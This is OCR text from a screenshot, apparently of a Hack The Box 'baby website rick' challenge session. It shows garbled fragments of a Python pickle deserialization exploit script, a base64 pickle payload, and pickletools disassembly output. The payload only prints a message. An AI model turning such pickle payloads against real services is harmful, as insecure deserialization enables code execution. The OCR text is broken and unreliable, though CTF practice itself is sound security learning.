{"path":"zzz_res/attachments/baby_website_rick_4.png","text":"a kali@kali: ~/CTFs/HTB/challenge/web/baby website rick -ox ~ICTFs/HTB/challenge/web/baby website rick/exploit.py - Sublime Text (UNREGISTERED) Y File Actions Edit View Help File Edit Selection Find View Goto Tools Project Preferences Help L—s(kalis kali)-[~/../HTB/challenge/web/baby website rick] “ [ cecomptieny P v python3 exploit.py 1x . i 8 c GLOBAL 'copy_reg _reconstructor’ ] el —— 25: ( MARK 1 oy 26: ¢ GLOBAL ' _main_ Exploit’ 3 inport basesd s a G —builtin__ object 5 plan_b = 'KGRWMAPTI3NLcnVtIwpuMQp]Y29weV9yZWckX3J1Y29uc3RydWNBb3IKCDIKKGN FX21hali5 fXwphbnRpX3BpY21 el HONE 6 antipickle serum = 'test’ 65: t TUPLE [ 7 - - 66: R REDUCE H 673V UNICODE 'bro’ 9 # dump the data 72: b BUILD 10 data = bases4.bo4decode(plan_b) 73: . sTop 11 print(f'Decoded pickle: {data}\") highest protocol among opcodes = 0 12 Bang! From bro. 13 14 print(“\\n\\nDecompiled pickle:\\n\") (kali® kali)-[~/../HTB/challenge/web/baby website rick] 15 data = pickletools.optinize(data) e e Ve¥ D 16 pickletools.dis(data) Decoded pickle: b\"(dpd\\nS'serun’\\np1\\nccopy_reg\\n_reconstructor\\np2\\n(c_main_\\nanti_pickle_serum\\np3\\nc_builtin & . e __ \\nobject\\np4\\nNtpS\\nRp6\\ns.. \" 18 print(*\\n\\noumped pickle:\\n\") 19 pickle.loads(data) Decompiled pickle: ¢ <> exploitpy x +v o: MARK 1:d pICT [ 1 inport pickle 3 2:s STRING *serum’ 2 import pickletools Anc 11: ¢ GLOBAL 'copy_reg _reconstructor' PR =onibesess = 36: ( MARK g Lt 37: ¢ GLOBAL '_main__ anti_pickle_serun’ i T TR s ¢ esEwloit 85: N NoNE 8 Self.name = name 86: t TUPLE (L) o | 87: R REDUCE 10 def _getstate (self): 88: s SETITEM 1 return self.name 80: . sTOP 12 highest protocol among opcodes = 0 13 def _setstate (self, state): 14 Sel.name = state 15 print(f'Bang! From {self.name}.\") Dumped pickle: 16 . B 17 exploit = Exploit(‘bro’) i Traceback (most recent call last): }g pickled bomb = pickle.dumps(exploit, protocol=6) F);;k{IE|Ajl{n:ﬁl;:};i(é:l;s/lﬂl}/(hallenge/ueb/baby website rick/decompile.py”, line 19, in <module> T - e e ) File \"/usr/lib/python3.9/copyreg.py”, line 43, in _reconstructor 3 EEIB e obj - object._new_(cls) . 23 unpickled bomb = pickle.loads (pickled bomb) TypeError: object._new_(X): X is not a type object (str) - - [ (a® kL)~ [~/-/HTB/chal Lenge/web/baby website rick] S| 1%","libVersion":"0.5.0","langs":"eng"}